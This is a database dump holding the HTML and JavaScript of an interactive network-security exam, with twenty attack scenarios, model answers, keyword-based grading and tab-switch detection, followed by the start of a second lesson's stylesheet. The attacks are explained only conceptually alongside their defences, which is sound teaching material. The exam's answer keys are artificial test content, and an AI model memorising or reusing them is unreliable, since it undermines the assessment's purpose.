id="ans-input" placeholder="Describe the attack, vulnerability, or security concept. Explain your reasoning clearly…" oninput="checkInput()"></textarea>\n  </div>\n  <div class="clearfix">\n    <button class="btn-submit" id="sub-btn" disabled onclick="submitAnswer()">Submit Answer →</button>\n  </div>\n</div>\n\n<!-- ── END SCREEN ── -->\n<div id="end-screen">\n  <div class="end-wrap">\n    <div class="end-icon" id="end-icon">📋</div>\n    <div class="end-title" id="end-title">Attempt Complete</div>\n    <div class="end-sub" id="end-sub">Here''s how you did on this attempt</div>\n    <div class="end-score" id="end-score">0</div>\n    <div style="font-family:var(--mono);font-size:12px;color:#888;letter-spacing:1px;">out of 20</div>\n    <div class="end-attempts-left" id="end-attempts-left"></div>\n    <div class="end-btns" id="end-btns"></div>\n    <div class="end-note" id="end-note"></div>\n  </div>\n</div>\n\n<!-- ── RESULTS (full review) ── -->\n<div id="results">\n  <div class="results-banner">\n    <div class="rb-tag">Final Debrief — All Attempts</div>\n    <div class="rb-h1">Assessment<br>Complete</div>\n    <div class="score-ring" id="score-ring">\n      <div class="ring-num" id="final-num">0</div>\n      <div class="ring-denom">/ 20</div>\n    </div><br>\n    <span class="grade-badge" id="grade-badge"></span>\n    <p id="grade-msg" style="margin-top:14px;font-family:var(--mono);font-size:12px;color:#888;letter-spacing:1px;"></p>\n  </div>\n\n  <div class="attempt-history">\n    <div class="ah-title">// Attempt History</div>\n    <div id="attempt-history-rows"></div>\n  </div>\n\n  <div class="review-header">// Best Attempt — Full Answer Review</div>\n  <div id="review-list"></div>\n  <button class="btn-restart" onclick="restartExam()">↺ Start Fresh</button>\n</div>\n\n</div><!-- /app -->\n\n<script>\nconst QS = [\n  {\n    scenario: `You are a SOC analyst at <mark>TechVault Corp</mark>. An employee reports that when they visit <code>www.internalbank.com</code>, the browser shows a legitimate-looking page but their credentials are being stolen. On investigation, you find the company''s DNS server is returning a <mark>rogue IP address</mark> for that domain — pointing to an attacker-controlled server.`,\n    question: "Identify the attack occurring, explain how it works at the DNS layer, and describe two countermeasures TechVault Corp should implement.",\n    modelAnswer: "This is a DNS Cache Poisoning (DNS Spoofing) attack. The attacker injected false DNS records into the resolver''s cache, so legitimate domain queries return a malicious IP. Countermeasures: (1) Deploy DNSSEC to cryptographically sign DNS records so forged responses are rejected; (2) Use DNS over HTTPS/TLS (DoH/DoT) to encrypt DNS queries, preventing interception and manipulation.",\n    keywords: ["DNS poisoning","DNS spoofing","cache","DNSSEC","rogue IP","DNS over HTTPS","DoT","false record","resolver"]\n  },\n  {\n    scenario: `During a network audit at <mark>SecureBank</mark>, you observe that when any client on the LAN broadcasts <em>"Who has IP 10.0.0.1?"</em>, a foreign host floods the network with replies claiming that MAC address <code>AA:BB:CC:DD:EE:FF</code> belongs to 10.0.0.1. All client traffic now flows through this foreign host before reaching the real gateway.`,\n    question: "Name this attack, explain the protocol it exploits and why it is inherently vulnerable, and propose a switch-level control to mitigate it.",\n    modelAnswer: "This is ARP Spoofing (ARP Poisoning), enabling a Man-in-the-Middle (MitM) attack. ARP is vulnerable because it is stateless and unauthenticated — hosts accept ARP replies without verifying whether they requested them. Mitigation: Enable Dynamic ARP Inspection (DAI) on managed switches, which validates ARP packets against a DHCP snooping binding table and drops unauthorized ARP replies.",\n    keywords: ["ARP spoofing","ARP poisoning","man in the middle","MitM","stateless","unauthenticated","Dynamic ARP Inspection","DAI","DHCP snooping","gratuitous ARP"]\n  },\n  {\n    scenario: `The web server at <mark>GlobalShop</mark> is receiving thousands of TCP connection requests per second. Each request completes the first handshake step (SYN) but never sends the final ACK. The server''s connection table fills up entirely and legitimate users cannot connect. Source IPs appear spoofed and distributed.`,\n    question: "Identify this attack, explain which TCP mechanism it abuses, and describe two technical mitigations a network engineer could deploy.",\n    modelAnswer: "This is a SYN Flood (DoS/DDoS) attack. It abuses TCP''s three-way handshake: the server allocates resources for each half-open connection after SYN but the attacker never completes the handshake, exhausting the connection table. Mitigations: (1) SYN Cookies — encode connection state into the sequence number requiring no resource allocation until handshake completes; (2) Rate limiting or upstream DDoS scrubbing to filter spoofed SYN packets.",\n    keywords: ["SYN flood","TCP","three-way handshake","half-open","SYN cookies","rate limiting","denial of service","DoS","connection table","spoofed"]\n  },\n  {\n    scenario: `At <mark>GlobalNet ISP</mark>, BGP routing tables show that traffic destined for a major bank''s IP prefix is being rerouted through an unknown autonomous system in another country, adding 200ms latency and enabling interception before reaching the destination.`,\n    question: "What network-layer attack is described? Explain why BGP is susceptible, and name a standard mechanism designed to prevent it.",\n    modelAnswer: "This is a BGP Hijacking attack. BGP is susceptible because it was designed for trust between autonomous systems — routers accept route announcements from peers without cryptographic verification. An attacker can announce ownership of IP prefixes they don''t control. Prevention: RPKI (Resource Public Key Infrastructure), which cryptographically validates Route Origin Authorizations (ROAs) to ensure only legitimate ASes can announce specific prefixes.",\n    keywords: ["BGP hijacking","Border Gateway Protocol","autonomous system","RPKI","Route Origin Authorization","ROA","prefix","trust","announcement","interception"]\n  },\n  {\n    scenario: `At <mark>MedData Hospital</mark>, staff connect to Wi-Fi named <code>MedData_WiFi</code>. An attacker sets up a hotspot with the exact same SSID and a stronger signal. Many staff devices automatically connect. All traffic — including login credentials and patient data — is now visible to the attacker.`,\n    question: "Name this wireless attack, explain why devices connect automatically, and describe two defences the hospital should implement.",\n    modelAnswer: "This is an Evil Twin Attack (Rogue Access Point). Devices connect automatically because 802.11 clients reconnect to known SSIDs based on signal strength without verifying the access point''s certificate. Defences: (1) Deploy 802.1X/EAP enterprise authentication — devices verify the server certificate, preventing connection to rogue APs; (2) Use a WIDS/WIPS to detect rogue APs broadcasting the corporate SSID and alert or contain them.",\n    keywords: ["evil twin","rogue access point","SSID","802.1X","EAP","certificate","WIDS","WIPS","automatic reconnect","signal strength"]\n  },\n  {\n    scenario: `A penetration tester at <mark>FinancePro Ltd</mark> captures an NTLM authentication exchange and extracts a hashed credential. Without cracking the hash, the tester injects the raw hash into a new authentication request and successfully authenticates as the target user to a file server.`,\n    question: "What attack has the tester demonstrated? Explain why this works without the plaintext password, and suggest a protocol-level mitigation.",\n    modelAnswer: "This is a Pass-the-Hash attack. It works because NTLM uses the password hash as the authentication proof itself — the server never verifies the plaintext. An attacker with the hash can authenticate without knowing the actual password. Mitigation: Disable NTLM and enforce Kerberos with mutual authentication. Additionally, use Credential Guard and Protected Users policies to prevent hash extraction.",\n    keywords: ["pass the hash","NTLM","hash","authentication","Kerberos","plaintext","credential","inject","replay","Protected Users","Credential Guard"]\n  },\n  {\n    scenario: `A switch at <mark>DataFort HQ</mark> begins broadcasting all frames out every port instead of only to the intended destination. A rogue host has been sending millions of frames with randomized fake source MAC addresses, completely filling the switch''s MAC address table.`,\n    question: "Identify this attack, explain what happens when the MAC table is full, and name the switch security feature that prevents it.",\n    modelAnswer: "This is a MAC Flooding attack. When the CAM (Content Addressable Memory) table is full, the switch cannot map new MACs to ports and defaults to broadcasting all frames like a hub — allowing any port to capture traffic meant for others. Mitigation: Port Security — configure a maximum number of allowed MAC addresses per port, triggering a violation action (e.g., port shutdown) when exceeded.",\n    keywords: ["MAC flooding","CAM table","Content Addressable Memory","port security","broadcast","hub","MAC address","violation","switch","overflow"]\n  },\n  {\n    scenario: `At <mark>RetailNet</mark>, an attacker on VLAN 10 (staff) is crafting Ethernet frames with two 802.1Q tags — outer tag VLAN 10, inner tag VLAN 20 (finance). The switch strips the outer tag and forwards the frame into VLAN 20, allowing the attacker to reach finance hosts.`,\n    question: "Name this attack, explain step-by-step how the double tagging works, and identify the configuration flaw that enables it.",\n    modelAnswer: "This is VLAN Hopping via Double Tagging. The attacker crafts a frame with two 802.1Q tags: outer tag matches the attacker''s native VLAN, inner tag is the target VLAN. The first switch strips the outer tag and forwards the frame; if the trunk port shares the same native VLAN, the frame passes with the inner tag intact to the second switch, which delivers it to the target VLAN. Fix: Set the native VLAN on trunk ports to an unused VLAN (e.g., VLAN 999) and explicitly tag all traffic.",\n    keywords: ["VLAN hopping","double tagging","802.1Q","native VLAN","trunk port","inner tag","outer tag","unused VLAN","strip","forward"]\n  },\n  {\n    scenario: `Logs at <mark>LogixSoft</mark> show a host sending DNS queries every 60 seconds for subdomains like <code>dGhpcyBpcyBiYXNlNjQ.malicious-c2.com</code> and similar high-entropy names. No firewall blocks DNS. The queries don''t resolve but persist for months, and the host shows signs of data exfiltration.`,\n    question: "What technique is the attacker using? Explain the mechanism, why it evades traditional firewalls, and describe a detection method.",\n    modelAnswer: "This is DNS Tunneling for Command-and-Control (C2). The attacker encodes data (commands, exfiltrated info) within DNS query subdomains as base64 or similar. The attacker''s authoritative DNS server decodes them and responds via DNS records. It evades firewalls because DNS (port 53) is almost universally permitted outbound. Detection: monitor for long subdomain labels, high query frequency to one domain, or high entropy strings using DNS security solutions.",\n    keywords: ["DNS tunneling","C2","command and control","exfiltration","base64","subdomain","port 53","encoded","entropy","DNS firewall","detection"]\n  },\n  {\n    scenario: `<mark>CloudBridge</mark> uses WEP-encrypted wireless for warehouse terminals. A researcher passively captures ~50,000 packets and using <code>aircrack-ng</code> recovers the full encryption key in under 3 minutes — without brute force.`,\n    question: "Explain specifically why WEP is cryptographically broken, the root cause, and what replaced it.",\n    modelAnswer: "WEP is broken due to its flawed use of RC4 with a short 24-bit Initialization Vector (IV). IVs are limited and reused under moderate traffic, generating the same keystream repeatedly. An attacker collecting packets with repeated IVs can apply statistical attacks (FMS/KoreK) to derive the root key. Also, WEP uses CRC-32 for integrity which is not cryptographically secure. WEP was replaced by WPA (TKIP) then WPA2 (AES-CCMP).",\n    keywords: ["WEP","RC4","initialization vector","IV","reuse","keystream","statistical attack","CRC-32","WPA2","AES","TKIP","FMS","aircrack"]\n  },\n  {\n    scenario: `A firewall at <mark>NetShield Corp</mark> has: Rule 1 — permit ALL TCP from ANY to ANY on port 443. Rule 2 — deny all traffic from a known malicious IP range. The firewall uses top-down first-match evaluation. Malicious IPs are still reaching internal servers over HTTPS.`,\n    question: "What is the critical misconfiguration and what consequence does it create? How should the ruleset be corrected?",\n    modelAnswer: "The misconfiguration is rule ordering: the permit-all rule appears before the deny rule. With first-match evaluation, malicious IPs match Rule 1 (permit) and Rule 2 is never reached — the block list is nullified. Fix: Move deny rules for known malicious ranges above broad permit rules. Apply least privilege — replace permit-all with specific source/destination permit rules.",\n    keywords: ["rule order","first match","permit all","deny","port 443","firewall","misconfiguration","least privilege","HTTPS","malicious IP","nullified"]\n  },\n  {\n    scenario: `Logs from <mark>HealthPlus</mark> show a host sending ICMP echo request packets of nearly <code>65,000 bytes</code> each to an external IP. The target host experiences crashes and reboots. The attack comes from a single machine.`,\n    question: "Identify this specific attack, explain the IP stack vulnerability it exploits, and state why it is largely historical.",\n    modelAnswer: "This is the Ping of Death attack. It exploits a vulnerability in IP stack reassembly: IP max packet size is 65,535 bytes but MTU forces fragmentation. When the receiver reassembles fragments totalling more than 65,535 bytes, a buffer overflow occurs causing crashes. It is historical because modern operating systems validate total packet size during reassembly and discard illegal oversized packets.",\n    keywords: ["ping of death","ICMP","65535","buffer overflow","IP fragmentation","reassembly","MTU","patch","historical","overflow"]\n  },\n  {\n    scenario: `An employee at <mark>FinanceCorp</mark> receives an email appearing to be from the CEO requesting an urgent wire transfer. Email headers reveal the Return-Path is <code>ceo@financec0rp.com</code> (zero instead of ''o'') and the sending mail server IP is not in FinanceCorp''s SPF record.`,\n    question: "What type of attack is this? Explain how SPF, DKIM, and DMARC together would have detected or blocked it.",\n    modelAnswer: "This is a Business Email Compromise (BEC)/Spear Phishing attack using email spoofing. SPF flags the email because the sending server IP isn''t in FinanceCorp''s SPF record. DKIM reveals no valid cryptographic signature from financecorp.com''s private key. DMARC with a reject policy ties SPF and DKIM together — if both fail alignment, the receiving server rejects the email outright.",\n    keywords: ["BEC","spear phishing","email spoofing","SPF","DKIM","DMARC","Return-Path","sender policy","domain alignment","reject policy","cryptographic signature"]\n  },\n  {\n    scenario: `A network architect is designing <mark>HealthPlus Hospital</mark>''s network. Patient-facing web portals must be reachable from the internet. The internal patient records database must never be directly accessible from outside the hospital. Compliance requires strict network isolation.`,\n    question: "Describe the network architecture you would implement, including security zones, components, and traffic flow controls.",\n    modelAnswer: "Deploy a DMZ (Demilitarized Zone) using a dual-firewall design. Web servers sit in the DMZ — between an external firewall and an internal firewall. External firewall permits inbound HTTPS to DMZ web servers only. Internal firewall permits only specific application traffic from DMZ to the database (e.g., TCP 3306) and denies all direct internet-to-internal access. This creates defense-in-depth — compromising a DMZ server still leaves the internal firewall protecting the database.",\n    keywords: ["DMZ","demilitarized zone","dual firewall","web server","database","internal network","HTTPS","defense in depth","traffic flow","firewall rule","isolation","zone"]\n  },\n  {\n    scenario: `A red team at <mark>LogixSoft</mark> gained initial access via phishing. All internal servers share one flat network with no internal firewalls or segment restrictions. The team moved laterally across 14 servers in 2 hours, reaching the crown jewel database with no alerts triggered.`,\n    question: "What architectural security model was absent? Describe it and list three technical controls that would have constrained lateral movement.",\n    modelAnswer: "The absent model is Zero Trust Architecture (ZTA) — ''never trust, always verify,'' applied to east-west (internal) traffic. Three controls: (1) Micro-segmentation — divide the network into granular zones with per-workload firewall policies; (2) Identity-based access control — require mutual TLS or authenticated sessions even between internal services; (3) Privileged Access Management (PAM) and least-privilege service accounts — prevent compromised credentials from accessing multiple systems.",\n    keywords: ["zero trust","micro-segmentation","lateral movement","east-west","flat network","least privilege","PAM","mutual TLS","never trust","internal firewall","segmentation"]\n  },\n  {\n    scenario: `<mark>Nexagen Corp</mark> deploys an appliance that sits inline on the network, detects known attack signatures and anomalies, and <mark>automatically drops or resets malicious connections</mark> without human intervention. A second team proposes a system that only monitors and generates alerts without taking action.`,\n    question: "Differentiate between the two systems. Explain the trade-offs in choosing one over the other in a production environment.",\n    modelAnswer: "The inline auto-blocking system is an IPS (Intrusion Prevention System). The monitor-only system is an IDS (Intrusion Detection System). IPS is inline and actively drops packets/resets connections in real time; IDS is passive (out-of-band/SPAN) and only detects and alerts. Trade-offs: IPS provides active protection but false positives can block legitimate traffic causing outages. IDS has no traffic impact but requires human response. Organizations often start with IDS to tune rules, then transition to IPS on critical segments.",\n    keywords: ["IPS","IDS","inline","passive","block","alert","false positive","prevention","detection","out-of-band","SPAN","drop packets","trade-off"]\n  },\n  {\n    scenario: `At a café, an attacker performs a MitM attack by presenting a self-signed SSL certificate to a user''s browser. The browser shows a certificate warning. The user clicks "proceed anyway." The attacker decrypts, reads, and re-encrypts all traffic including banking credentials.`,\n    question: "What attack is occurring? Explain the interception technique, and describe two browser/network controls that would prevent it even if the user ignores warnings.",\n    modelAnswer: "This is an SSL/TLS MitM (Man-in-the-Middle) attack via SSL interception. The attacker performs TLS termination — one TLS session with the user (fake cert) and one with the real server. Two controls: (1) HSTS (HTTP Strict Transport Security) with preloading — browsers enforce HTTPS and refuse invalid certificates without user override; (2) Certificate Pinning — the application/browser pins the expected certificate/public key and rejects any non-matching certificate, including the attacker''s.",\n    keywords: ["MitM","man in the middle","SSL stripping","TLS","HSTS","certificate pinning","self-signed","intercept","decrypt","strict transport","preload"]\n  },\n  {\n    scenario: `<mark>RetailChain</mark> has all POS terminals, management workstations, and the HR system on the same flat network segment. An attacker who compromised one POS terminal can directly access the HR salary database without any additional obstacles.`,\n    question: "What network design principle was violated? Describe how VLANs combined with ACLs would address this, including which systems belong in which segments.",\n    modelAnswer: "The violated principle is Network Segmentation (least privilege at the network level). Solution: Create separate VLANs — VLAN 10 (POS terminals), VLAN 20 (Management), VLAN 30 (HR/Corporate). Apply inter-VLAN ACLs: POS terminals may only reach the payment processor on specific ports — VLAN 10 to VLAN 30 is blocked entirely. Management (VLAN 20) has defined access with authentication. This ensures a compromised POS cannot reach HR systems.",\n    keywords: ["network segmentation","VLAN","ACL","least privilege","flat network","inter-VLAN","Layer 3","POS","isolation","segment","firewall rule","access control"]\n  },\n  {\n    scenario: `An employee at <mark>TechFirm</mark> installs a free VPN app from an unofficial source. The VPN intercepts all browser traffic, injects ads into HTTP pages, and sends browsing history to a remote server. The corporate firewall only sees encrypted VPN traffic leaving the endpoint.`,\n    question: "What category of threat does this represent? Why are endpoint-only controls insufficient, and describe two controls that would have prevented or detected this.",\n    modelAnswer: "This is a rogue/malicious application threat — a form of spyware with data exfiltration. Endpoint-only antivirus is insufficient because the VPN traffic is encrypted (bypassing perimeter inspection), and behaviour-based detection of what appears to be a legitimate VPN process is unreliable. Two controls: (1) Application whitelisting — only approved corporate applications are permitted to run, blocking unauthorised VPN installations; (2) DLP with SSL inspection via a corporate proxy/SASE solution — encrypted traffic from endpoints is inspected via a trusted certificate, detecting exfiltration.",\n    keywords: ["spyware","rogue application","supply chain","endpoint","application whitelisting","DLP","SSL inspection","SASE","proxy","data exfiltration","encrypted traffic","policy"]\n  },\n  {\n    scenario: `A junior admin at <mark>CloudOps Inc.</mark> accidentally makes a cloud storage bucket public. It contains network diagrams, firewall rules, IP addressing schemes, and VPN credentials. A threat actor downloads all files within 2 hours.`,\n    question: "Classify each type of information exposed and explain how each enables further attacks. What three controls would have prevented this exposure?",\n    modelAnswer: "Exposed: (1) Network diagrams/IP schemes — enables targeted reconnaissance and attack path mapping; (2) Firewall rules — reveals permitted traffic, letting attackers craft bypass traffic; (3) VPN credentials — enables direct authenticated access bypassing the perimeter entirely. Three controls: (1) Block-public-access policies enforced at cloud account level; (2) DLP scanning of storage objects for sensitive content triggering alerts; (3) Secrets management vault (e.g., HashiCorp Vault, AWS Secrets Manager) — credentials should never exist in documents.",\n    keywords: ["data exposure","misconfiguration","cloud storage","bucket","firewall rules","VPN credentials","reconnaissance","DLP","secrets management","block public access","least privilege","vault"]\n  }\n];\n\nconst MAX_ATTEMPTS = 4; // 1 original + 3 retakes\nlet currentQ = 0;\nlet attemptNum = 1;\nlet allAttempts = []; // array of attempt result arrays\nlet currentAttemptAnswers = [];\nlet tabViolations = 0;\nconst MAX_TAB_VIOLATIONS = 3;\nlet examActive = false;\n\nfunction startExam() {\n  document.getElementById(''intro'').style.display = ''none'';\n  examActive = true;\n  beginAttempt();\n}\n\nfunction beginAttempt() {\n  currentQ = 0;\n  currentAttemptAnswers = [];\n  document.getElementById(''exam'').style.display = ''block'';\n  document.getElementById(''end-screen'').style.display = ''none'';\n  document.getElementById(''results'').style.display = ''none'';\n  document.getElementById(''attempt-badge'').textContent = `Attempt ${attemptNum} of ${MAX_ATTEMPTS}`;\n  renderQ();\n}\n\nfunction renderQ() {\n  const q = QS[currentQ];\n  document.getElementById(''q-num'').textContent = currentQ + 1;\n  document.getElementById(''prog-fg'').style.width = (currentQ / 20 * 100) + ''%'';\n  document.getElementById(''ans-input'').value = '''';\n  document.getElementById(''sub-btn'').disabled = true;\n  document.getElementById(''q-area'').innerHTML = `\n    <div class="scenario-box">\n      <div class="sc-tag">// Scenario ${String(currentQ+1).padStart(2,''0'')}</div>\n      <div class="sc-body">${q.scenario}</div>\n    </div>\n    <div class="q-box">\n      <div class="q-tag">// Question</div>\n      <div class="q-text">${q.question}</div>\n    </div>`;\n  document.getElementById(''ans-input'').focus();\n}\n\nfunction checkInput() {\n  document.getElementById(''sub-btn'').disabled = document.getElementById(''ans-input'').value.trim().length < 10;\n}\n\nfunction submitAnswer() {\n  const val = document.getElementById(''ans-input'').value.trim();\n  if (!val) return;\n  const q = QS[currentQ];\n  const lower = val.toLowerCase();\n  const matched = q.keywords.filter(k => lower.includes(k.toLowerCase()));\n  const score = matched.length >= 4 ? ''correct'' : matched.length >= 2 ? ''partial'' : ''incorrect'';\n  currentAttemptAnswers.push({ qIdx: currentQ, text: val, matched, score });\n  currentQ++;\n  if (currentQ < 20) {\n    renderQ();\n  } else {\n    finishAttempt();\n  }\n}\n\nfunction finishAttempt() {\n  document.getElementById(''exam'').style.display = ''none'';\n  allAttempts.push([...currentAttemptAnswers]);\n\n  const score = currentAttemptAnswers.filter(a => a.score === ''correct'').length;\n  const attemptsRemaining = MAX_ATTEMPTS - attemptNum;\n  const isLastAttempt = attemptNum >= MAX_ATTEMPTS;\n\n  const endEl = document.getElementById(''end-screen'');\n  endEl.style.display = ''block'';\n\n  document.getElementById(''end-score'').textContent = score;\n  document.getElementById(''end-score'').style.color = score >= 15 ? ''var(--green)'' : score >= 10 ? ''var(--accent2)'' : ''var(--accent)'';\n\n  let icon = score >= 15 ? ''🏆'' : score >= 10 ? ''📊'' : ''📋'';\n  document.getElementById(''end-icon'').textContent = icon;\n  document.getElementById(''end-title'').textContent = isLastAttempt ? ''Final Attempt Complete'' : `Attempt ${attemptNum} Complete`;\n  document.getElementById(''end-sub'').textContent = isLastAttempt\n    ? ''You have used all your attempts.''\n    : `You answered ${score}/20 correctly on this attempt.`;\n\n  if (isLastAttempt) {\n    document.getElementById(''end-attempts-left'').textContent = ''No retakes remaining — full review unlocked.'';\n    document.getElementById(''end-btns'').innerHTML = `<button class="btn-see-answers" onclick="showFullResults()">View Full Review & Answers →</button>`;\n    document.getElementById(''end-note'').textContent = '''';\n  } else {\n    document.getElementById(''end-attempts-left'').textContent = `${attemptsRemaining} retake${attemptsRemaining > 1 ? ''s'' : ''''} remaining — answers are hidden until all retakes are used.`;\n    document.getElementById(''end-btns'').innerHTML = `\n      <button class="btn-retake" onclick="doRetake()">Retake Exam (Attempt ${attemptNum + 1})</button>\n      <button class="btn-see-answers" onclick="showFullResults()">Finish & See Answers</button>`;\n    document.getElementById(''end-note'').textContent = ''Choosing "Finish & See Answers" will use your remaining retakes and unlock the full review.'';\n  }\n}\n\nfunction doRetake() {\n  attemptNum++;\n  document.getElementById(''end-screen'').style.display = ''none'';\n  document.getElementById(''attempt-badge'').textContent = `Attempt ${attemptNum} of ${MAX_ATTEMPTS}`;\n  beginAttempt();\n}\n\nfunction showFullResults() {\n  document.getElementById(''end-screen'').style.display = ''none'';\n  document.getElementById(''results'').style.display = ''block'';\n  examActive = false;\n\n  // Find best attempt\n  const scores = allAttempts.map(att => att.filter(a => a.score === ''correct'').length);\n  const bestScore = Math.max(...scores);\n  const bestIdx = scores.indexOf(bestScore);\n  const bestAttempt = allAttempts[bestIdx];\n\n  document.getElementById(''final-num'').textContent = bestScore;\n  const pct = (bestScore / 20) * 100;\n  let grade, gColor, msg;\n  if(pct >= 85){ grade=''Distinction''; gColor=''var(--green)''; msg=''Exceptional command of network security fundamentals''; }\n  else if(pct >= 70){ grade=''Merit''; gColor=''var(--accent2)''; msg=''Strong understanding — minor gaps to revisit''; }\n  else if(pct >= 55){ grade=''Pass''; gColor=''var(--amber)''; msg=''Foundational knowledge present — targeted revision needed''; }\n  else { grade=''Fail''; gColor=''var(--accent)''; msg=''Significant review required across core topics''; }\n\n  document.getElementById(''score-ring'').style.borderColor = gColor;\n  document.getElementById(''final-num'').style.color = gColor;\n  const gb = document.getElementById(''grade-badge'');\n  gb.textContent = grade;\n  gb.style.color = gColor;\n  gb.style.borderColor = gColor;\n  document.getElementById(''grade-msg'').textContent = msg;\n\n  // Attempt history\n  const histEl = document.getElementById(''attempt-history-rows'');\n  histEl.innerHTML = allAttempts.map((att, i) => {\n    const s = att.filter(a => a.score === ''correct'').length;\n    const isBest = i === bestIdx;\n    return `<div class="ah-row">\n      <span class="ah-lbl">Attempt ${i+1}${isBest ? '' ★ Best'' : ''''}</span>\n      <span class="ah-score" style="color:${s>=15?''var(--green)'':s>=10?''var(--accent2)'':''var(--accent)''}">${s} / 20</span>\n    </div>`;\n  }).join('''');\n\n  // Review — show best attempt answers + model answers\n  const list = document.getElementById(''review-list'');\n  list.innerHTML = bestAttempt.map((a) => {\n    const q = QS[a.qIdx];\n    const missed = q.keywords.filter(k => !a.matched.map(m=>m.toLowerCase()).includes(k.toLowerCase()));\n    const statusLabel = a.score === ''correct'' ? ''✓ Strong Answer'' : a.score === ''partial'' ? ''◑ Partial Answer'' : ''✗ Needs Work'';\n    return `\n      <div class="rev-item">\n        <div class="rev-head">\n          <span class="rev-num">Q${String(a.qIdx+1).padStart(2,''0'')}</span>\n          <span class="rev-status ${a.score}">${statusLabel}</span>\n          <span class="rev-scenario-mini">${q.question.substring(0,60)}…</span>\n        </div>\n        <div class="rev-body">\n          <div class="rev-q">${q.question}</div>\n          <div class="rev-section">\n            <div class="rev-section-label">Your Answer (Best Attempt)</div>\n            <div class="rev-user-ans">${a.text || ''—''}</div>\n          </div>\n          <div class="rev-section">\n            <div class="rev-section-label">Model Answer</div>\n            <div class="rev-model-ans">${q.modelAnswer}</div>\n          </div>\n          <div class="rev-section">\n            <div class="rev-section-label">Key Concepts</div>\n            <div class="rev-kws">\n              ${a.matched.map(k => `<span class="kw-tag matched">✓ ${k}</span>`).join('''')}\n              ${missed.map(k => `<span class="kw-tag missed">✗ ${k}</span>`).join('''')}\n            </div>\n          </div>\n        </div>\n      </div>`;\n  }).join('''');\n}\n\nfunction restartExam() {\n  currentQ = 0; attemptNum = 1; allAttempts = []; currentAttemptAnswers = [];\n  tabViolations = 0;\n  document.getElementById(''tab-counter'').textContent = ''⚠ Violations: 0/3'';\n  document.getElementById(''results'').style.display = ''none'';\n  document.getElementById(''intro'').style.display = ''block'';\n  examActive = false;\n}\n\n// ── TAB SWITCH DETECTION ──\ndocument.addEventListener(''visibilitychange'', () => {\n  if (!examActive) return;\n  if (document.hidden) {\n    tabViolations++;\n    document.getElementById(''tab-counter'').textContent = `⚠ Violations: ${tabViolations}/3`;\n    document.getElementById(''tab-warn-count'').textContent =\n      tabViolations >= MAX_TAB_VIOLATIONS\n        ? `⚠ MAXIMUM VIOLATIONS REACHED — Exam terminated.`\n        : `Violations: ${tabViolations} / 3 — ${MAX_TAB_VIOLATIONS - tabViolations} remaining before termination.`;\n    document.getElementById(''tab-overlay'').classList.add(''show'');\n    document.getElementById(''tab-overlay'').classList.add(''shake'');\n    setTimeout(() => document.getElementById(''tab-overlay'').classList.remove(''shake''), 500);\n\n    if (tabViolations >= MAX_TAB_VIOLATIONS) {\n      document.getElementById(''tab-warn-btn'').textContent = ''View Results (Exam Terminated)'';\n      document.getElementById(''tab-warn-btn'').onclick = () => {\n        document.getElementById(''tab-overlay'').classList.remove(''show'');\n        examActive = false;\n        finishAttempt();\n      };\n    }\n  }\n});\n\nwindow.addEventListener(''blur'', () => {\n  if (!examActive) return;\n  // Only count if the page is also hidden (tab switch, not just clicking a link)\n});\n\nfunction dismissTabWarning() {\n  if (tabViolations < MAX_TAB_VIOLATIONS) {\n    document.getElementById(''tab-overlay'').classList.remove(''show'');\n  }\n}\n</script>\n</body>\n</html>\n', 'html_interactive', NULL, NULL, NULL, NULL, 0, 0, 10, 'Published', 1, '2026-03-05 06:50:23', '2026-03-10 10:15:45', NULL, NULL);
INSERT INTO `wpcu_mtti_lessons` VALUES
(12, 8, NULL, 'Cybersec Interactive Lesson', 'Revision of Exam One', '<!DOCTYPE html>\n<html lang="en">\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0">\n<title>Network Security — Interactive Lesson</title>\n<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;600;700&family=Playfair+Display:wght@700;800;900&display=swap" rel="stylesheet">\n<style>\n:root {\n  --bg: #0b0e14;\n  --surface: #111520;\n  --surface2: #161b27;\n  --border: #1e2535;\n  --border2: #28304a;\n  --text: #e8ecf4;\n  --muted: #6b7897;\n  --dim: #3a4260;\n  --cyan: #00d4ff;\n  --green: #00e87a;\n  --amber: #ffb547;\n  --red: #ff4f6b;\n  --purple: #b47fff;\n  --blue: #4a8cff;\n  --mono: ''JetBrains Mono'', monospace;\n  --body: ''Space Grotesk'', sans-serif;\n  --display: ''Playfair Display'', serif;\n}\n*, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }\nhtml { scroll-behavior: smooth; }\n\nbody {\n  background: var(--bg);\n  color: var(--text);\n  font-family: var(--body);\n  min-height: 100vh;\n  overflow-x: hidden;\n}\n\n/* ── BACKGROUND GRID ── */\nbody::before {\n  content: '''';\n  position: fixed;\n  inset: 0;\n  background-image:\n    linear-gradient(rgba(0,212,255,0.03) 1px, transparent 1px),\n    linear-gradient(90deg, rgba(0,212,255,0.03) 1px, transparent 1px);\n  background-size: 40px 40px;\n  pointer-events: none;\n  z-index: 0;\n}\n\n/* ── HERO ── */\n#hero {\n  position: relative;\n  z-index: 1;\n  padding: 80px 24px 60px;\n  text-align: center;\n  border-bottom: 1px solid var(--border);\n  background: radial-gradient(ellipse 70% 50% at 50% 0%, rgba(0,212,255,0.07) 0%, transparent 70%);\n}\n.hero-eyebrow {\n  font-family: var(--mono);\n  font-size: 11px;\n  letter-spacing: 4px;\n  color: var(--cyan);\n  text-transform: uppercase;\n  margin-bottom: 20px;\n  display: flex;\n  align-items: center;\n  justify-content: center;\n  gap: 12px;\n}\n.hero-eyebrow::before, .hero-eyebrow::after {\n  content:'''';\n  width: 40px;\n  height: 1px;\n  background: var(--cyan);\n  opacity: 0.4;\n}\n.hero-h1 {\n  font-family: var(--display);\n  font-size: clamp(38px, 7vw, 72px);\n  font-weight: 900;\n  line-height: 1.0;\n  margin-bottom: 16px;\n  letter-spacing: -1px;\n}\n.hero-h1 .glow {\n  color: var(--cyan);\n  text-shadow: 0 0 40px rgba(0,212,255,0.5);\n}\n.hero-sub {\n  font-size: 16px;\n  color: var(--muted);\n  max-width: 560px;\n  margin: 0 auto 36px;\n  line-height: 1.7;\n}\n.hero-stats {\n  display: inline-flex;\n  gap: 0;\n  border: 1px solid var(--border2);\n  border-radius: 8px;\n  overflow: hidden;\n  margin-bottom: 40px;\n}\n.hs-cell {\n  padding: 16px 28px;\n  border-right: 1px solid var(--border2);\n  text-align: center;\n}\n.hs-cell:last-child { border-right: none; }\n.hs-val { font-family: var(--display); font-size: 28px; font-weight: 800; color: 